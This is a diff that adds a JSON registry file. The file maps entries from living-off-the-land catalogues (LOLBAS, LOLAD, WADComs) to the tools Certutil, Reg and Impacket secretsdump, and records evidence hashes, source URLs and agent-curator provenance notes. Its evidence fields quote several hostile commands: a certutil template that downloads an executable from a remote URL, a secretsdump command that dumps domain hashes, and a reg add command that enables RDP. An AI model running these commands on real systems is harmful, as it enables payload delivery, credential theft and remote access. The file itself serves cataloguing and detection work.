@@ -1,0 +1,563 @@
+{
+  "aliases": [
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "historical_evidence": {
+        "blob_sha1": "7a5fb7daa75f36a8449dea287990623a62eacb08",
+        "document_utf8": "id: lolbas/certutil/download/0\ntype: binary\nplatform: windows\nname: Certutil.exe\nphases:\n- command-and-control\ncapabilities:\n- file-download\nprivilege_required: user\nsources:\n- project: LOLBAS\n  upstream_url: https://lolbas-project.github.io\n  license: GPL-3.0\n  upstream_version: 67781fd\n  last_synced: '2026-08-29'\nattack_techniques:\n- T1105\nopsec:\n  noise: high\n  triggers: Certutil.exe creating new files on disk\n  detection_refs:\n  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml\n  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml\n  - https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_decode.yml\n  - https://github.com/elastic/detection-rules/blob/4a11ef9514938e7a7e32cf5f379e975cebf5aed3/rules/windows/defense_evasion_suspicious_certutil_commands.toml\n  - https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/command_and_control_certutil_network_connection.toml\n  - https://github.com/splunk/security_content/blob/3f77e24974239fcb7a339080a1a483e6bad84a82/detections/endpoint/certutil_download_with_urlcache_and_split_arguments.yml\ncommands:\n- template: certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}\n  comment: Download and save an executable to disk in the current folder.\nreferences:\n- https://lolbas-project.github.io/lolbas/Binaries/Certutil/\ntags:\n- windows\n- lolbas\nsource_data:\n  LOLBAS:\n    raw:\n      name: Certutil.exe\n      category: Download\n      privileges: User\n      mitre_id: T1105\n    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Certutil/\n    upstream_version: 67781fd\n    last_synced: '2026-08-29'\nenrichment:\n  capabilities:\n  - value: file-download\n    provenance:\n      type: adapter\n      source: LOLBAS\n      adapter: lolbas@67781fd\n    confidence:\n      level: high\n  phases:\n  - value: command-and-control\n    provenance:\n      type: adapter\n      source: LOLBAS\n      adapter: lolbas@67781fd\n    confidence:\n      level: high\n  attack_techniques:\n  - value: T1105\n    provenance:\n      type: upstream\n      source: LOLBAS\n      adapter: lolbas@67781fd\n    confidence:\n      level: high\n  privilege_required:\n    value: user\n    provenance:\n      type: adapter\n      source: LOLBAS\n      adapter: lolbas@67781fd\n    confidence:\n      level: high\n_meta:\n  schema_version: 1\n  generated_by: loldex-projection\n  projected_at: '2026-08-29'\n  source_hashes:\n    LOLBAS: sha256:d6cbad7e2377c18b187a7020df7ab4fe44ea26a95b4deee4ef1c484e987570db\n",
+        "repository_commit": "eaa8fa5e3eb19f28041e06362e43c2d08eee60bc",
+        "repository_path": "data/entries/windows/lolbas__certutil__download__0.yaml",
+        "sha256": "sha256:fb798a155ab179d8e58cf3a8d3a9efa4243593e2a9ed919621a9d1b678edf169"
+      },
+      "id": "alias:lolbas-certutil-download-zero:d2",
+      "kind": "d2_lolbas_identity_change",
+      "new_entry_ids": [
+        "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/RG93bmxvYWQ/0"
+      ],
+      "old_entry_id": "lolbas/certutil/download/0",
+      "provenance": {
+        "curator": "agent",
+        "note": "Offline agent review of the actual pre-D2 repository entry at the pinned Git commit/blob: same Certutil name, type and command establish this explicit one-to-one source identity migration; no automatic redirect or membership inheritance.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+      "source": "LOLBAS",
+      "source_files": [
+        "OSBinaries/Certutil.yml"
+      ]
+    }
+  ],
+  "checksum": "sha256:e5ae31d19480374df3b670a1157291cf3bfe5b2507cc40c07091155adbf61dd2",
+  "claims": [
+    {
+      "confidence": {
+        "level": "low"
+      },
+      "entity_id": "tool:impacket-secretsdump",
+      "entry_context": "active-directory",
+      "entry_id": "lolad/RHVtcCBEb21haW4gSGFzaGVzIHdpdGggU2VjcmV0c0R1bXA/c2VjcmV0c2R1bXAucHkgZG9tYWluL3VzZXJuYW1lOnBhc3N3b3JkQHRhcmdldA/UHl0aG9uIChJbXBhY2tldCk",
+      "evidence": [
+        {
+          "pointer": "/physical_rows/0/row_utf8",
+          "required_literals": [
+            "secretsdump.py domain/username:password@target",
+            "Python (Impacket)",
+            "https://github.com/SecureAuthCorp/impacket"
+          ],
+          "review_revision": "6ed6a258f6e5a4692cec07f9692ed097551e04e5",
+          "sha256": "sha256:f69dd4afebffd397635e395088573a1e037cdfcc7264e17a54c17cb766ec2c0e",
+          "source": "LOLAD",
+          "url": "https://github.com/lolad-project/lolad-project.github.io/blob/6ed6a258f6e5a4692cec07f9692ed097551e04e5/index.html"
+        }
+      ],
+      "id": "claim:impacket-secretsdump:lolad:domain-hashes",
+      "provenance": {
+        "curator": "agent",
+        "note": "Agent-selected command-token association supported by the pinned source context. Runtime PATH, binary version and actual execution platform are not proved; the entry technique is not equivalent to the tool.",
+        "source": "LOLAD",
+        "type": "heuristic"
+      },
+      "relation": "uses_tool"
+    },
+    {
+      "confidence": {
+        "level": "low"
+      },
+      "entity_id": "tool:impacket-secretsdump",
+      "entry_context": "active-directory",
+      "entry_id": "wadcoms/Impacket-SecretsDump-NTDS",
+      "evidence": [
+        {
+          "pointer": "/document",
+          "required_literals": [
+            "Impacket's secretsdump.py",
+            "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
+            "secretsdump.py"
+          ],
+          "review_revision": "0c4609d7dffa7c12a378863a360636c9f275b240",
+          "sha256": "sha256:0c21d13efb8338d98e4acb0d2213928da5219bd16a103e6102d9ec3f3d176d12",
+          "source": "WADComs",
+          "url": "https://github.com/WADComs/WADComs.github.io/blob/0c4609d7dffa7c12a378863a360636c9f275b240/_wadcoms/Impacket-SecretsDump-NTDS.md"
+        }
+      ],
+      "id": "claim:impacket-secretsdump:wadcoms:ntds",
+      "provenance": {
+        "curator": "agent",
+        "note": "Agent-selected command-token association supported by the pinned source context. Runtime PATH, binary version and actual execution platform are not proved; the entry technique is not equivalent to the tool.",
+        "source": "WADComs",
+        "type": "heuristic"
+      },
+      "relation": "uses_tool"
+    },
+    {
+      "confidence": {
+        "level": "low"
+      },
+      "entity_id": "tool:impacket-secretsdump",
+      "entry_context": "active-directory",
+      "entry_id": "wadcoms/Impacket-SecretsDump",
+      "evidence": [
+        {
+          "pointer": "/document",
+          "required_literals": [
+            "Impacket's secretsdump.py",
+            "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py",
+            "secretsdump.py"
+          ],
+          "review_revision": "0c4609d7dffa7c12a378863a360636c9f275b240",
+          "sha256": "sha256:242b390ecdac7d296c649ed614fafeea20f2d3cbb76a0d33529d819732ed65d2",
+          "source": "WADComs",
+          "url": "https://github.com/WADComs/WADComs.github.io/blob/0c4609d7dffa7c12a378863a360636c9f275b240/_wadcoms/Impacket-SecretsDump.md"
+        }
+      ],
+      "id": "claim:impacket-secretsdump:wadcoms:remote",
+      "provenance": {
+        "curator": "agent",
+        "note": "Agent-selected command-token association supported by the pinned source context. Runtime PATH, binary version and actual execution platform are not proved; the entry technique is not equivalent to the tool.",
+        "source": "WADComs",
+        "type": "heuristic"
+      },
+      "relation": "uses_tool"
+    },
+    {
+      "confidence": {
+        "level": "low"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "active-directory",
+      "entry_id": "lolad/Q2hlY2sgRG9tYWluIENvbnRyb2xsZXIgQ2VydGlmaWNhdGVz/Y2VydHV0aWwgLWRjaW5mbyB2ZXJpZnk/Q01E",
+      "evidence": [
+        {
+          "pointer": "/physical_rows/0/row_utf8",
+          "required_literals": [
+            "certutil -dcinfo verify",
+            "<td>CMD</td>"
+          ],
+          "review_revision": "6ed6a258f6e5a4692cec07f9692ed097551e04e5",
+          "sha256": "sha256:0000e3a4ed26cc1433fa943a161a96924231a34f14e5be94d4fe3be47ce39a3e",
+          "source": "LOLAD",
+          "url": "https://github.com/lolad-project/lolad-project.github.io/blob/6ed6a258f6e5a4692cec07f9692ed097551e04e5/index.html"
+        }
+      ],
+      "id": "claim:windows-certutil:lolad:dcinfo",
+      "provenance": {
+        "curator": "agent",
+        "note": "Agent-selected command-token association supported by the pinned source context. Runtime PATH, binary version and actual execution platform are not proved; the entry technique is not equivalent to the tool.",
+        "source": "LOLAD",
+        "type": "heuristic"
+      },
+      "relation": "uses_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/RG93bmxvYWQ/0",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Certutil.exe",
+            "C:\\Windows\\System32\\certutil.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:9e10c346f9f2669ac96f4b1effd6f1701bdd989fde73fcc7fef2f43e9e9de3c4",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml"
+        }
+      ],
+      "id": "claim:windows-certutil:lolbas:0",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/RG93bmxvYWQ/1",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Certutil.exe",
+            "C:\\Windows\\System32\\certutil.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:9e10c346f9f2669ac96f4b1effd6f1701bdd989fde73fcc7fef2f43e9e9de3c4",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml"
+        }
+      ],
+      "id": "claim:windows-certutil:lolbas:1",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/QURT/2",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Certutil.exe",
+            "C:\\Windows\\System32\\certutil.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:9e10c346f9f2669ac96f4b1effd6f1701bdd989fde73fcc7fef2f43e9e9de3c4",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml"
+        }
+      ],
+      "id": "claim:windows-certutil:lolbas:2",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/RG93bmxvYWQ/3",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Certutil.exe",
+            "C:\\Windows\\System32\\certutil.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:9e10c346f9f2669ac96f4b1effd6f1701bdd989fde73fcc7fef2f43e9e9de3c4",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml"
+        }
+      ],
+      "id": "claim:windows-certutil:lolbas:3",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/RW5jb2Rl/4",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Certutil.exe",
+            "C:\\Windows\\System32\\certutil.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:9e10c346f9f2669ac96f4b1effd6f1701bdd989fde73fcc7fef2f43e9e9de3c4",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml"
+        }
+      ],
+      "id": "claim:windows-certutil:lolbas:4",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/RGVjb2Rl/5",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Certutil.exe",
+            "C:\\Windows\\System32\\certutil.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:9e10c346f9f2669ac96f4b1effd6f1701bdd989fde73fcc7fef2f43e9e9de3c4",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml"
+        }
+      ],
+      "id": "claim:windows-certutil:lolbas:5",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-certutil",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9DZXJ0dXRpbC55bWw/RGVjb2Rl/6",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Certutil.exe",
+            "C:\\Windows\\System32\\certutil.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:9e10c346f9f2669ac96f4b1effd6f1701bdd989fde73fcc7fef2f43e9e9de3c4",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Certutil.yml"
+        }
+      ],
+      "id": "claim:windows-certutil:lolbas:6",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "low"
+      },
+      "entity_id": "tool:microsoft-windows-reg",
+      "entry_context": "active-directory",
+      "entry_id": "lolad/RW5hYmxlIFJlbW90ZSBEZXNrdG9wIChSRFAp/cmVnIGFkZCAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcQ29udHJvbFxUZXJtaW5hbCBTZXJ2ZXIiIC92IGZEZW55VFNDb25uZWN0aW9ucyAvdCBSRUdfRFdPUkQgL2QgMCAvZg/Q01E",
+      "evidence": [
+        {
+          "pointer": "/physical_rows/0/row_utf8",
+          "required_literals": [
+            "reg add",
+            "fDenyTSConnections",
+            "<td>CMD</td>"
+          ],
+          "review_revision": "6ed6a258f6e5a4692cec07f9692ed097551e04e5",
+          "sha256": "sha256:9bde98a223faa68e3dbcd9341bbccbfc46a58b5f0a2ac58d0441d16519bc4233",
+          "source": "LOLAD",
+          "url": "https://github.com/lolad-project/lolad-project.github.io/blob/6ed6a258f6e5a4692cec07f9692ed097551e04e5/index.html"
+        }
+      ],
+      "id": "claim:windows-reg:lolad:enable-rdp",
+      "provenance": {
+        "curator": "agent",
+        "note": "Agent-selected command-token association supported by the pinned source context. Runtime PATH, binary version and actual execution platform are not proved; the entry technique is not equivalent to the tool.",
+        "source": "LOLAD",
+        "type": "heuristic"
+      },
+      "relation": "uses_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-reg",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9SZWcueW1s/QURT/0",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Reg.exe",
+            "C:\\Windows\\System32\\reg.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:c70b8d36a9398e0902da99c7f0cac66d42413c80d5956bb022077280444f2fc5",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Reg.yml"
+        }
+      ],
+      "id": "claim:windows-reg:lolbas:0",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "high"
+      },
+      "entity_id": "tool:microsoft-windows-reg",
+      "entry_context": "windows",
+      "entry_id": "lolbas/T1NCaW5hcmllcy9SZWcueW1s/Q3JlZGVudGlhbHM/1",
+      "evidence": [
+        {
+          "pointer": "/document_utf8",
+          "required_literals": [
+            "Name: Reg.exe",
+            "C:\\Windows\\System32\\reg.exe"
+          ],
+          "review_revision": "2056cb7662509dc998fc6ce79636aec4e6c0397f",
+          "sha256": "sha256:c70b8d36a9398e0902da99c7f0cac66d42413c80d5956bb022077280444f2fc5",
+          "source": "LOLBAS",
+          "url": "https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Reg.yml"
+        }
+      ],
+      "id": "claim:windows-reg:lolbas:1",
+      "provenance": {
+        "curator": "agent",
+        "note": "Exact upstream Name and full Windows executable path establish documented tool metadata; this does not verify behavior.",
+        "source": "LOLBAS",
+        "type": "adapter"
+      },
+      "relation": "documents_tool"
+    },
+    {
+      "confidence": {
+        "level": "low"
+      },
+      "entity_id": "tool:microsoft-windows-reg",
+      "entry_context": "active-directory",
+      "entry_id": "wadcoms/Regexe-Persistence",
+      "evidence": [
+        {
+          "pointer": "/document",
+          "required_literals": [
+            "reg.exe add",
+            "  - Windows",
+            "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg"
+          ],
+          "review_revision": "0c4609d7dffa7c12a378863a360636c9f275b240",
+          "sha256": "sha256:87fb7199b5d99d4e4a37308b30814eb243531da508c69fbacff302fa8a9267d3",
+          "source": "WADComs",
+          "url": "https://github.com/WADComs/WADComs.github.io/blob/0c4609d7dffa7c12a378863a360636c9f275b240/_wadcoms/Regexe-Persistence.md"
+        }
+      ],
+      "id": "claim:windows-reg:wadcoms:persistence",
+      "provenance": {
+        "curator": "agent",
+        "note": "Agent-selected command-token association supported by the pinned source context. Runtime PATH, binary version and actual execution platform are not proved; the entry technique is not equivalent to the tool.",
+        "source": "WADComs",
+        "type": "heuristic"
+      },
+      "relation": "uses_tool"
+    }
+  ],
+  "entities": [
+    {
+      "candidate_tokens": [
+        "secretsdump.py",
+        "impacket-secretsdump"
+      ],
+      "id": "tool:impacket-secretsdump",
+      "identifiers": [
+        {
+          "namespace": "github-source-path",
+          "value": "https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"
+        }
+      ],
+      "kind": "tool",
+      "label": "Impacket secretsdump",
+      "platform_scope": {
+        "contexts": [
+          "active-directory"
+        ],
+        "runtime": [
+          "linux",
+          "windows"
+        ]
+      },
+      "scope_note": "Registry-declared logical tool, not a binary hash/version or equivalence of entry techniques. Supported runtime families and catalogue contexts are separate; execution PATH is not attested."
+    },
+    {
+      "candidate_tokens": [
+        "certutil",
+        "certutil.exe"
+      ],
+      "id": "tool:microsoft-windows-certutil",
+      "identifiers": [
+        {
+          "namespace": "windows-command",
+          "value": "certutil.exe"
+        },
+        {
+          "namespace": "windows-full-path",
+          "value": "C:\\Windows\\System32\\certutil.exe"
+        }
+      ],
+      "kind": "tool",
+      "label": "Windows Certutil",
+      "platform_scope": {
+        "contexts": [
+          "windows",
+          "active-directory"
+        ],
+        "runtime": [
+          "windows"
+        ]
+      },
+      "scope_note": "Registry-declared logical tool, not a binary hash/version or equivalence of entry techniques. Supported runtime families and catalogue contexts are separate; execution PATH is not attested."
+    },
+    {
+      "candidate_tokens": [
+        "reg",
+        "reg.exe"
+      ],
+      "id": "tool:microsoft-windows-reg",
+      "identifiers": [
+        {
+          "namespace": "windows-command",
+          "value": "reg.exe"
+        },
+        {
+          "namespace": "windows-full-path",
+          "value": "C:\\Windows\\System32\\reg.exe"
+        }
+      ],
+      "kind": "tool",
+      "label": "Windows Reg",
+      "platform_scope": {
+        "contexts": [
+          "windows",
+          "active-directory"
+        ],
+        "runtime": [
+          "windows"
+        ]
+      },
+      "scope_note": "Registry-declared logical tool, not a binary hash/version or equivalence of entry techniques. Supported runtime families and catalogue contexts are separate; execution PATH is not attested."
+    }
+  ],
+  "revision": 2,
+  "version": 1
+}
